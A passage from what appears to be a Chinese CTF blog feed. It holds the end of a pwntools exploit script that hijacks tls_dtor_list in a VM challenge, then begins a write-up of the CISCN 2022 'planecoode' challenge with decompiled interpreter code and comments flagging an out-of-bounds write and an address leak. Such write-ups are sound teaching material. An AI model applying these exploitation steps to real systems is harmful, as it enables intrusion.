class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,pos_offset)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#change the tls_dtor_list</span></span><br><span class=\"line\">push(<span class=\"number\">0</span>)</span><br><span class=\"line\">mov_r_i(<span class=\"number\">1</span>,heap_offset-<span class=\"number\">0x100</span>)</span><br><span class=\"line\">push(<span class=\"number\">1</span>)</span><br><span class=\"line\">sub()</span><br><span class=\"line\">pop(<span class=\"number\">2</span>)</span><br><span class=\"line\">mov_m_r(<span class=\"number\">2</span>,tls_dtor_list_heap_offset+<span class=\"number\">0x20</span>)\t<span class=\"comment\">#list = heap_address</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">push(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;b exit&#x27;)</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(<span class=\"built_in\">len</span>(code)))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;continue&quot;</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Please input your code size:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x1f0</span>))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Please input your memory count:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x6000000000008000</span>))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Please input your code:&quot;</span>,code)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/06/20/ciscn-2022-planecoode/",
            "url": "http://example.com/2022/06/20/ciscn-2022-planecoode/",
            "title": "ciscn_2022_planecoode",
            "date_published": "2022-06-20T14:53:19.000Z",
            "content_html": "<h1 id=\"ciscn_2022-planecoode\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2022-planecoode\">#</a> CISCN_2022 planecoode</h1>\n<p>这个题目算是一个 llvm 的题目，对于我们输入的 code 进行解析操作，但是逆向的工程量很大，设计了很多 if,else 的模块，对应众多的操作。而且并不是说常规 vm 那种可以解析出常见汇编指令格式的操作码。而且使用了很多数据的转换操作，比如 BYTE1~BYTE5，HIBYTE,LOBYTE 等等，这些东西是我们必须回的东西。</p>\n<p>然后经过我长时间的解析，大概猜出来了流程，我们指定最开始的 xy, 这是边界限制，申请出来 8*x*y 字节的空间，然后对应的 (x,y) 的位置是一个 code,code 为 8 字节 64 位，储存在上述空间，然后开辟一个 x*y 大小的 stack，用来储存数据。</p>\n<p>下面的就是对于 code 解析处理，我们看到每次处理都是以 8 字节位单位，根据 x,y 来取指令，我们最简单的无疑是顺序取指。如何实现顺序取指？我们看看取指令的逻辑</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">entry</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *vale; <span class=\"comment\">// [rsp+0h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  init_SIZE();                                  <span class=\"comment\">// 确定XY的范围</span></span><br><span class=\"line\">  <span class=\"built_in\">map</span> = (__int64 **)init_map(size_X, size_Y);</span><br><span class=\"line\">  set_code_data();                              <span class=\"comment\">// 填入code数据</span></span><br><span class=\"line\">  sub_E91();                                    <span class=\"comment\">// 选择初始位置</span></span><br><span class=\"line\">  sub_1583();                                   <span class=\"comment\">// 模拟栈空间</span></span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    vale = (<span class=\"type\">void</span> *)get_value_fromXY((__int64)<span class=\"built_in\">map</span>, size_X, size_Y, x_temp, y_temp);\t\t<span class=\"comment\">//根据xy来取指</span></span><br><span class=\"line\">    result = operation(vale);                   <span class=\"comment\">// 根据我们输入的code进行操作</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( result );</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里是函数的主入口，我们重点关注取指令跟 x,y 的关系</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">get_value_fromXY</span><span class=\"params\">(__int64 <span class=\"built_in\">map</span>, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> XN, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> YN, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> x, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> y)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 pos; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  pos = get_pos(<span class=\"built_in\">map</span>, XN, YN, x, y);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( pos )</span><br><span class=\"line\">    result = get_code(pos);\t\t\t\t\t<span class=\"comment\">//return *(_QWORD *)a1;</span></span><br><span class=\"line\">  <span class=\"keyword\">else</span>\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">get_pos</span><span class=\"params\">(__int64 <span class=\"built_in\">map</span>, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> XN, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> YN, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> x, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> y)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 pos; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  pos = check(XN, YN, x, y);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( pos == <span class=\"number\">-1</span> )</span><br><span class=\"line\">    result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    result = <span class=\"number\">8</span> * pos + <span class=\"built_in\">map</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">check</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> XN, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> YN, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> x, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> y)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( x &lt; XN &amp;&amp; y &lt; YN )</span><br><span class=\"line\">    result = XN * y + x;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    result = <span class=\"number\">-1LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最内部是对我们提供的用来定位的 xy 的检查，然后 XN 是我们最开始输入的 x 的范围，因为我们确定了我们要顺序取指，所以，我这里直接将 YN 设置 1，将一个 2 维矩阵简化为以为的顺序，然后我们提供的初始位置都是从 0 开始，（0，0）并且下次取指只要对 x 进行加 1 的操作，y 一直为 0，这样从原来的 code [y][x] 直接简化为 code [x]。但是本质没有差别，知识实现了代码操作的简化。我们填入的 code，每次都会通过 strtoul (s, 0LL, 10) 转化为无符号的整数，储存在 64 位的空间中，这也是为什么我们 code 的空间是 8*x*y。</p>\n<p>接下来就是对 code 的解析，这一部分是最恶心的，太多种情况了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> n; <span class=\"comment\">// [rsp+1Ch] [rbp-24h]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *buf; <span class=\"comment\">// [rsp+28h] [rbp-18h]</span></span><br><span class=\"line\">  __int64 s; <span class=\"comment\">// [rsp+30h] [rbp-10h] OVERLAPPED BYREF</span></span><br><span class=\"line\">  __int64 canary; <span class=\"comment\">// [rsp+38h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  canary = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(s));</span><br><span class=\"line\">  s = code;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x54</span> )          <span class=\"comment\">// 输出栈顶数据一字节</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&#123;%c&#125;&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)*(<span class=\"type\">char</span> *)sRSP);</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0x54</span>u )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xCC</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      pop_(<span class=\"number\">1u</span>);                                 <span class=\"comment\">// 数值与初始值相比，大于等于1，现在的数值就减一</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0xCC</span>u )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code != <span class=\"number\">0xD0</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0xD0</span>u )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xD1</span> )  <span class=\"comment\">// 结束</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xDA</span> &amp;&amp; *(<span class=\"type\">int</span> *)((<span class=\"type\">char</span> *)&amp;s + <span class=\"number\">1</span>) &lt; size_X * size_Y )<span class=\"comment\">// 只检查了offset是否大于边界，但是未考虑到rsp,数组越界</span></span><br><span class=\"line\">            *(_BYTE *)(sRSP + *(<span class=\"type\">int</span> *)((<span class=\"type\">char</span> *)&amp;s + <span class=\"number\">1</span>)) = BYTE5(s);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xCD</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          buf = <span class=\"built_in\">malloc</span>(BYTE1(s));               <span class=\"comment\">// malloc (0xe0)</span></span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;content: &quot;</span>);</span><br><span class=\"line\">          n = read(<span class=\"number\">0</span>, buf, BYTE1(s));           <span class=\"comment\">// read 0xcd</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( n &gt; <span class=\"number\">0</span> &amp;&amp; *((_BYTE *)buf + n - <span class=\"number\">1</span>) == <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">            *((_BYTE *)buf + n - <span class=\"number\">1</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;You say \\&quot;%s\\&quot;\\n&quot;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)buf);<span class=\"comment\">// 泄露地址</span></span><br><span class=\"line\">          <span class=\"built_in\">free</span>(buf);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x98</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        pop_(<span class=\"number\">4u</span>);                               <span class=\"comment\">// pop （int）</span></span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code != <span class=\"number\">0xCA</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x6A</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          *(_BYTE *)sRSP -= BYTE1(s);           <span class=\"comment\">// [rsp] - [code]</span></span><br><span class=\"line\">          rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *(_BYTE *)sRSP = BYTE1(s);</span><br><span class=\"line\">    rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">54</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(_BYTE *)sRSP = sub_CBE();                 <span class=\"comment\">// push 1 bytes</span></span><br><span class=\"line\">    rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0x36</span>u )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x45</span> )        <span class=\"comment\">// push 4byte</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE1(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE2(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE3(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE4(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0x45</span>u )   <span class=\"comment\">// BYTEx是对64位code进行拆分,0为最低位</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">73</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (BYTE2(s) &lt;&lt; <span class=\"number\">8</span>) + (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)BYTE1(s) &lt;= size_X &amp;&amp; (BYTE4(s) &lt;&lt; <span class=\"number\">8</span>) + (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)BYTE3(s) &lt;= size_Y )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          x_temp = (BYTE2(s) &lt;&lt; <span class=\"number\">8</span>) + BYTE1(s);</span><br><span class=\"line\">          y_temp = (BYTE4(s) &lt;&lt; <span class=\"number\">8</span>) + BYTE3(s);  <span class=\"comment\">// 设置下一个start的位置，相当于jmp</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">82</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        *(_BYTE *)sRSP += BYTE1(s);</span><br><span class=\"line\">        rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">65</span> &amp;&amp; BYTE1(s) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(_BYTE *)sRSP = *(<span class=\"type\">char</span> *)sRSP / (__int16)BYTE1(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ( (<span class=\"type\">unsigned</span> __int8)code )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">0x13</span>u:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( chance &lt;= <span class=\"number\">0</span> )                      <span class=\"comment\">// 重置</span></span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        set_code_data();</span><br><span class=\"line\">        sub_E91();</span><br><span class=\"line\">        --chance;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">0x33</span>u:</span><br><span class=\"line\">        *(_BYTE *)sRSP ^= BYTE1(s);</span><br><span class=\"line\">        rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">0x12</span>u:</span><br><span class=\"line\">        *(_BYTE *)sRSP *= BYTE1(s);</span><br><span class=\"line\">        rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">LABEL_55:</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> ( HIBYTE(s) )                          <span class=\"comment\">// 最后一字节</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">-1</span>, <span class=\"number\">-1</span>);                          <span class=\"comment\">// x-1,y-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">0</span>, <span class=\"number\">-1</span>);                           <span class=\"comment\">// y-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">1</span>, <span class=\"number\">-1</span>);                           <span class=\"comment\">// x+1，y-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">-1</span>, <span class=\"number\">0</span>);                           <span class=\"comment\">// x-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">6</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">1</span>, <span class=\"number\">0</span>);                            <span class=\"comment\">// x+1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">7</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">-1</span>, <span class=\"number\">1</span>);                           <span class=\"comment\">// x-1,y+1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">8</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">0</span>, <span class=\"number\">1</span>);                            <span class=\"comment\">// y+1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">9</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">1</span>, <span class=\"number\">1</span>);                            <span class=\"comment\">// x+1,y+1</span></span><br><span class=\"line\">LABEL_65:</span><br><span class=\"line\">      result = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;End!&quot;</span>);</span><br><span class=\"line\">      result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看着这一摊东西，忍不住骂娘。</p>\n<p>先看最简单的，如何实现移动，也就是对 x,y 的操作</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 